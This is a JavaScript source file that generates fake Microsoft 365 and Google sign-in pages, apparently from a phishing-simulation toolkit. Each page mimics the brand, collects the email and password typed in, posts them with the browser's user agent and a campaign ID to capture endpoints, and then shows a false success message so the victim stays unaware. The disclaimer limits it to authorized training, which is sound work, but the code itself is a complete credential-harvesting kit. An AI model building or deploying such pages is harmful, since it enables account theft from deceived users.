// ═══════════════════════════════════════════════════════════════════
// PHISHING LANDING PAGES — Fake login pages for credential capture
//
// Educational demonstration of how phishing attacks capture
// credentials. Includes Microsoft 365, Google, and generic styles.
//
// ⚠️ For authorized security training and awareness testing ONLY
// ═══════════════════════════════════════════════════════════════════

export function getMicrosoftPhishPage(campaignId = '') {
    return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f2f2f2;
            display: flex; justify-content: center; align-items: center;
            min-height: 100vh;
        }
        .login-container {
            background: white;
            width: 440px;
            padding: 44px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
        }
        .logo {
            font-size: 24px;
            font-weight: 600;
            color: #1b1b1b;
            margin-bottom: 16px;
        }
        .logo span { color: #0078d4; }
        h2 {
            font-size: 24px;
            font-weight: 400;
            color: #1b1b1b;
            margin-bottom: 24px;
        }
        .input-group { margin-bottom: 20px; }
        .input-group input {
            width: 100%;
            padding: 8px 10px;
            border: none;
            border-bottom: 2px solid #666;
            font-size: 15px;
            outline: none;
            background: transparent;
            transition: border-color 0.2s;
        }
        .input-group input:focus {
            border-bottom-color: #0078d4;
        }
        .input-group label {
            font-size: 13px;
            color: #666;
            display: block;
            margin-bottom: 4px;
        }
        .btn-primary {
            background: #0078d4;
            color: white;
            border: none;
            padding: 10px 20px;
            font-size: 15px;
            cursor: pointer;
            float: right;
            min-width: 108px;
        }
        .btn-primary:hover { background: #106ebe; }
        .link { color: #0067b8; text-decoration: none; font-size: 13px; display: block; margin-bottom: 12px; }
        .link:hover { text-decoration: underline; }
        .footer { font-size: 12px; color: #666; margin-top: 30px; clear: both; }
        .success-msg {
            display: none;
            text-align: center;
            padding: 30px;
        }
        .success-msg .check {
            font-size: 48px;
            color: #107c10;
            margin-bottom: 16px;
        }
        .success-msg h3 { color: #1b1b1b; font-weight: 400; }
        .error-banner {
            background: #fff4ce;
            border-left: 4px solid #d83b01;
            padding: 12px;
            margin-bottom: 16px;
            font-size: 13px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div id="loginForm">
            <div class="logo">Microsoft</div>
            <h2>Sign in</h2>
            <div id="errorBanner" class="error-banner">
                Your account has been flagged. Please verify your credentials.
            </div>
            <div class="input-group">
                <label>Email, phone, or Skype</label>
                <input type="email" id="email" placeholder="user@company.com" autofocus>
            </div>
            <div class="input-group">
                <label>Password</label>
                <input type="password" id="password" placeholder="Password">
            </div>
            <a href="#" class="link">Forgot password?</a>
            <a href="#" class="link">Sign-in options</a>
            <button class="btn-primary" onclick="submitCreds()">Sign in</button>
            <div class="footer">
                <p>No account? <a href="#" style="color: #0067b8;">Create one!</a></p>
            </div>
        </div>

        <div id="successMsg" class="success-msg">
            <div class="check">✓</div>
            <h3>Password has been reset successfully</h3>
            <p style="color: #666; margin-top: 12px;">You can now close this window.</p>
        </div>
    </div>

    <script>
        function submitCreds() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            if (!email || !password) {
                document.getElementById('errorBanner').style.display = 'block';
                document.getElementById('errorBanner').textContent = 'Please enter both email and password.';
                return;
            }

            // Send captured credentials to server
            fetch('/api/phish/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    email: email,
                    password: password,
                    campaignId: '${campaignId}',
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent,
                    source: 'microsoft365'
                })
            });

            // Also record in campaign tracking if tracking ID exists
            const tid = '${campaignId}';
            if (tid) {
                fetch('/collect/' + tid, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email: email, password: password })
                });
            }

            // Show success message (victim thinks password was reset)
            setTimeout(() => {
                document.getElementById('loginForm').style.display = 'none';
                document.getElementById('successMsg').style.display = 'block';
            }, 500);
        }

        // Allow Enter key to submit
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') submitCreds();
        });
    </script>
</body>
</html>`;
}

export function getGooglePhishPage(campaignId = '') {
    return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
            background: #f8f9fa;
            display: flex; justify-content: center; align-items: center;
            min-height: 100vh;
        }
        .container {
            background: white;
            width: 450px;
            padding: 48px 40px 36px;
            border-radius: 8px;
            border: 1px solid #dadce0;
            text-align: center;
        }
        .google-logo {
            font-size: 28px; font-weight: 500; margin-bottom: 8px;
        }
        .google-logo .g-blue { color: #4285f4; }
        .google-logo .g-red { color: #ea4335; }
        .google-logo .g-yellow { color: #fbbc05; }
        .google-logo .g-green { color: #34a853; }
        h1 { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 8px; }
        .subtitle { font-size: 16px; color: #202124; margin-bottom: 32px; }
        .input-group { margin-bottom: 24px; text-align: left; }
        .input-group input {
            width: 100%;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            outline: none;
        }
        .input-group input:focus { border: 2px solid #1a73e8; }
        .link { color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; }
        .btn-next {
            background: #1a73e8; color: white;
            border: none; padding: 10px 24px;
            font-size: 14px; font-weight: 500;
            border-radius: 4px; cursor: pointer;
            float: right;
        }
        .btn-next:hover { background: #1765cc; }
        .bottom { margin-top: 32px; clear: both; text-align: left; }
        .success { display: none; text-align: center; padding: 20px; }
        .success .icon { font-size: 48px; color: #34a853; margin-bottom: 16px; }
    </style>
</head>
<body>
    <div class="container">
        <div id="form">
            <div class="google-logo">
                <span class="g-blue">G</span><span class="g-red">o</span><span class="g-yellow">o</span><span class="g-blue">g</span><span class="g-green">l</span><span class="g-red">e</span>
            </div>
            <h1>Sign in</h1>
            <p class="subtitle">Use your Google Account</p>
            <div class="input-group">
                <input type="email" id="email" placeholder="Email or phone">
            </div>
            <div class="input-group">
                <input type="password" id="password" placeholder="Enter your password">
            </div>
            <a href="#" class="link">Forgot email?</a>
            <div class="bottom">
                <a href="#" class="link">Create account</a>
                <button class="btn-next" onclick="capture()">Next</button>
            </div>
        </div>
        <div id="success" class="success">
            <div class="icon">✓</div>
            <h1>Account Verified</h1>
            <p style="color:#5f6368; margin-top:12px;">Your account is now secure. You may close this window.</p>
        </div>
    </div>
    <script>
        function capture() {
            const e = document.getElementById('email').value;
            const p = document.getElementById('password').value;
            if (!e || !p) return;
            fetch('/api/phish/capture', {
                method: 'POST',
                headers: {'Content-Type':'application/json'},
                body: JSON.stringify({ email:e, password:p, campaignId:'${campaignId}', timestamp:new Date().toISOString(), userAgent:navigator.userAgent, source:'google' })
            });
            const tid = '${campaignId}';
            if (tid) {
                fetch('/collect/' + tid, {
                    method: 'POST',
                    headers: {'Content-Type':'application/json'},
                    body: JSON.stringify({ email:e, password:p })
                });
            }
            setTimeout(() => {
                document.getElementById('form').style.display='none';
                document.getElementById('success').style.display='block';
            }, 500);
        }
        document.addEventListener('keydown', e => { if(e.key==='Enter') capture(); });
    </script>
</body>
</html>`;
}
